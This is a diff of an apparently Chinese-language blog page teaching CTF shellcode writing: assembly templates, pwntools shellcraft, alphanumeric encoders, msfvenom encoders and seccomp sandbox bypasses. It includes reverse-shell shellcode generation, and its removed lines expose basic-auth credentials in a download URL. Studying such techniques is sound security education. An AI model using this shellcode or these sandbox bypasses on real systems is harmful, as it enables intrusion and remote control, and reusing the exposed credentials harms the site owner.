@@ -89,7 +89,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -176,7 +176,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -305,7 +305,7 @@
 <p>学到最后，你会发现还是会回归到最原始的方式：手搓<code>shellcode</code>。</p>
 <h3 id="1-1-1-纯汇编">1-1-1 纯汇编</h3>
 <p>如果使用<code>gcc</code>编译，模板如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -334,8 +334,7 @@
 </span></span><span class="line"><span class="cl">    ;// SYS_exit
 </span></span><span class="line"><span class="cl">    mov rdi, 0
 </span></span><span class="line"><span class="cl">    mov rax, 60
-</span></span><span class="line"><span class="cl">    syscall
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    syscall</span></span></code></pre></td></tr></table>
 </div>
 </div><p>也可以使用<code>nasm</code>，只是编译的命令不一样。</p>
 <h3 id="1-1-2-内联汇编">1-1-2 内联汇编</h3>
@@ -347,7 +346,7 @@
 <p>在<code>main.c</code>中编写程序逻辑。如果需要剥离出<code>shellcode</code>，执行<code>get_shellcode.py</code>文件即可在当前目录生成<code>shellcode</code>文件，然后读取该文件，直接输入给目标程序即可。</p>
 <p>这个库当初是为了研究<code>dirty pipe</code>漏洞开发的，因为该漏洞不能写超过一页的<code>shellcode</code>。因此，需要编写复杂的<code>shellcode</code>，又不想写汇编的时候，可以用这个库直接写<code>C</code>，然后一键得到要注入的<code>shellcode</code>。</p>
 <p>如在<code>main.c</code>写入如下内容：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -368,11 +367,10 @@
 </span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;date&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="nf">popen_r</span><span class="p">(</span><span class="s">&#34;cat /etc/issue&#34;</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行后输出为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -385,8 +383,7 @@
 </span></span><span class="line"><span class="cl">Wed Feb <span class="m">19</span> 21:19:43 CST <span class="m">2023</span>
 </span></span><span class="line"><span class="cl">Ubuntu 20.04.4 LTS <span class="se">\n</span> <span class="se">\l</span>
 </span></span><span class="line"><span class="cl">$ ldd main
-</span></span><span class="line"><span class="cl">        not a dynamic executable
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">        not a dynamic executable</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以很方便的剥离<code>shellcode</code>。</p>
 <h2 id="1-2-借助工具">1-2 借助工具</h2>
@@ -394,7 +391,7 @@
 <p><code>pwntools</code>的<code>shellcraft</code>定义了非常多的模板，支持的架构有<code>x86/x64/arm/arm64</code>等等。</p>
 <p>点击<a href="http://docs.pwntools.com/en/latest/shellcraft.html"target="_blank" rel="external nofollow noopener noreferrer">pwnlib.shellcraft — Shellcode generation — pwntools 4.10.0dev documentation<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>进行学习。</p>
 <p>使用的示例如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -411,13 +408,12 @@
 </span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="s2">&#34;ipv4&#34;</span><span class="p">,</span> <span class="s2">&#34;tcp&#34;</span><span class="p">)</span><span class="o">+</span>\
 </span></span><span class="line"><span class="cl">               <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">,</span> <span class="s1">&#39;ipv4&#39;</span><span class="p">)</span><span class="o">+</span>\
 </span></span><span class="line"><span class="cl">               <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">dupsh</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">               <span class="p">)</span> <span class="c1"># 反弹shell</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">               <span class="p">)</span> <span class="c1"># 反弹shell</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="1-2-2-alpha3">1-2-2 alpha3</h3>
 <p>建议使用<a href="https://github.com/TaQini/alpha3"target="_blank" rel="external nofollow noopener noreferrer">TaQini/alpha3: Automatically exported from code.google.com/p/alpha3 (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>这个版本。</p>
 <p>使用需要指定基址寄存器：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -426,8 +422,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python ./ALPHA3.py x64 ascii mixedcase rax --input<span class="o">=</span><span class="s2">&#34;shellcode&#34;</span>
 </span></span><span class="line"><span class="cl">./shellcode_x64.sh rax
-</span></span><span class="line"><span class="cl">./shellcode_x86.sh eax
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">./shellcode_x86.sh eax</span></span></code></pre></td></tr></table>
 </div>
 </div><p>学习原文地址在<a href="https://www.freebuf.com/articles/system/232280.html"target="_blank" rel="external nofollow noopener noreferrer">Alphanumeric Shellcode：纯字符Shellcode生成指南 - FreeBuf网络安全行业门户<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
 <h3 id="1-2-3-ae64">1-2-3 AE64</h3>
@@ -439,7 +434,7 @@
 <p>没有前两个好用，有限考虑前两个工具。</p>
 <h3 id="1-2-5-msf生成">1-2-5 msf生成</h3>
 <p>很多编码的方式，但是对可见字符的编码支持受限。只有<code>x86</code>支持字符编码。</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -542,8 +537,7 @@
 </span></span><span class="line"><span class="cl">    x86/single_static_bit         manual     Single Static Bit
 </span></span><span class="line"><span class="cl">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
 </span></span><span class="line"><span class="cl">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
-</span></span><span class="line"><span class="cl">    x86/xor_dynamic               normal     Dynamic key XOR Encoder
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    x86/xor_dynamic               normal     Dynamic key XOR Encoder</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="1-3-在线网站">1-3 在线网站</h2>
 <p>搜集了一些非常有用的与<code>shellcode</code>相关的网站</p>
@@ -569,7 +563,7 @@
 <p>或者使用<code>open+sendfile</code>，指令会更短。</p>
 <h2 id="2-3-切换指令模式">2-3 切换指令模式</h2>
 <p>随便找一个<code>seccomp-tools</code>解析的沙箱规则：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -600,14 +594,13 @@
 </span></span><span class="line"><span class="cl"> 0007: 0x15 0x02 0x00 0x00000038  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> clone<span class="o">)</span> goto <span class="m">0010</span>
 </span></span><span class="line"><span class="cl"> 0008: 0x15 0x01 0x00 0x0000000f  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> rt_sigreturn<span class="o">)</span> goto <span class="m">0010</span>
 </span></span><span class="line"><span class="cl"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
-</span></span><span class="line"><span class="cl"> 0010: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"> 0010: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个沙箱规则判断了当前触发系统调用的时候，<code>arch</code>是否为<code>x64</code>，如果不是<code>64</code>就会<code>kill</code>；然后，判断了<code>sys-number</code>是否大于等于<code>0x40000000</code>，如果大于，程序也会被<code>kill</code>；然后设置了黑名单，分别是：<code>execve/execveat/fork/clone/rt_sigreturn</code>。处于黑名单的系统调用会被<code>kill</code>掉，其他系统调用则会放行。</p>
 <p>如果没有<code> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</code>这一句的检查，那么可以使用<code>retf(return far)</code>指令实现架构切换，或者在<code>x64</code>环境下直接调用<code>int 0x80</code>陷入到内核态。</p>
 <p><code>retf</code>相当于<code>pop ip; pop cs</code>，<code>cs</code>是段寄存器，寄存器为<code>0x23</code>时表示<code>32</code>位运行模式，<code>0x33</code>表示<code>64</code>位运行模式。</p>
 <p>从<code>64</code>位切换到<code>32</code>位的模板如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -624,22 +617,20 @@
 </span></span><span class="line"><span class="cl">mov [rsp+4], eax
 </span></span><span class="line"><span class="cl">mov eax, 0x400800 ; ip
 </span></span><span class="line"><span class="cl">mov [rsp], eax
-</span></span><span class="line"><span class="cl">retf
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">retf</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="2-4-使用0x40000000x系统调用">2-4 使用0x40000000+X系统调用</h2>
 <p>接着<code>2-3</code>，如果没有限制：<code> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010</code>的话，那么可以使用<code>0x40000000 + X</code>来执行系统调用。</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define __X32_SYSCALL_BIT	0x40000000UL
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define __X32_SYSCALL_BIT	0x40000000UL</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>关于<code>x32 ABI</code>可查看<a href="https://en.wikipedia.org/wiki/X32_ABI"target="_blank" rel="external nofollow noopener noreferrer">x32 ABI - Wikipedia<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
 <p>比如要执行<code>read</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -654,8 +645,7 @@
 </span></span><span class="line"><span class="cl">xor edi, edi
 </span></span><span class="line"><span class="cl">mov rsi, rsp
 </span></span><span class="line"><span class="cl">mov edx, 0x300
-</span></span><span class="line"><span class="cl">syscall
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">syscall</span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要注意的是，从<code>5.16</code>开始，<code>linux</code>内核不支持<code>x32 abi</code>了：<a href="https://bugs.launchpad.net/ubuntu/&#43;source/linux/&#43;bug/1994516"target="_blank" rel="external nofollow noopener noreferrer">Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries&hellip;” : Bugs : linux package : Ubuntu (launchpad.net)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
 <h1 id="3-字符型shellcode">3-字符型shellcode</h1>
@@ -667,7 +657,7 @@
 <h2 id="3-3-限制字母和数字">3-3 限制字母和数字</h2>
 <p>很多时候，会限制为纯小写字母或者部分字母或者部分数字。这个时候，需要根据限制条件，把能用的<code>shellcode</code>组合梳理出来，然后结合<code>shellcode</code>的执行地址，利用<code>xor/add</code>等指令，构造出其他所需要的指令。</p>
 <p>举个例子，假如<code>shellcode</code>执行地址<code>0x333100</code>，只能用<code>0x30-0x40</code>编写<code>shellcode</code>，如果需要<code>\x0f\x05</code>，可以用异或：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -676,11 +666,10 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xor eax, 0x33333130; 3530313333
 </span></span><span class="line"><span class="cl">xor eax, 0x3333343f; 353f343333
-</span></span><span class="line"><span class="cl">;此时，eax就成为0x050f了
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">;此时，eax就成为0x050f了</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以用<code>pwntools</code>的<code>disasm</code>爆破所有可能的<code>shellcode</code>组合：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -717,8 +706,7 @@
 </span></span><span class="line"><span class="cl">                <span class="n">need_p</span> <span class="o">=</span> <span class="mi">0</span>
 </span></span><span class="line"><span class="cl">                <span class="k">break</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">need_p</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后根据需要进行组合即可。</p>
 <p>字符型的<code>shellcode</code>要善于使用<code>xor</code>和<code>add</code>，善于借助已有的地址：</p>
@@ -738,7 +726,7 @@
 <p>与观察寄存器的值是一样的，观察一下栈上有没有可以利用的地址或者变量。因为<code>pop/push reg</code>，一般是一个字节，非常的短。</p>
 <h2 id="4-3-使用更短的指令">4-3 使用更短的指令</h2>
 <p>要把<code>rax</code>清零，可以使用的指令有：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -785,8 +773,7 @@
 </span></span><span class="line"><span class="cl">xchg rax, rbx
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">;93 假设ebx为0
-</span></span><span class="line"><span class="cl">xchg eax, ebx
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">xchg eax, ebx</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以发现，这些指令的长度都不一样，那么我们应该结合当时的上下文环境选用最短的指令，指令越短，自由度越高。</p>
 <p>怎么编写较短的指令，需要多积累多总结，比如：</p>
@@ -831,22 +818,20 @@
 </ul>
 <h2 id="4-8-借助段寄存器">4-8 借助段寄存器</h2>
 <p>段寄存器可以拿到代码段、堆、栈等地址，如：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov rbx, ds:[0x30]
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov rbx, ds:[0x30]</span></span></code></pre></td></tr></table>
 </div>
 </div><p>还可以借助<code>load effective address</code>指令：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-15"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lea rsp, [rip]
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lea rsp, [rip]</span></span></code></pre></td></tr></table>
 </div>
 </div><p>适用于<code>rsp</code>为异常值但需要栈的情况。</p>
 <h2 id="4-9-ptrace注入">4-9 ptrace注入</h2>
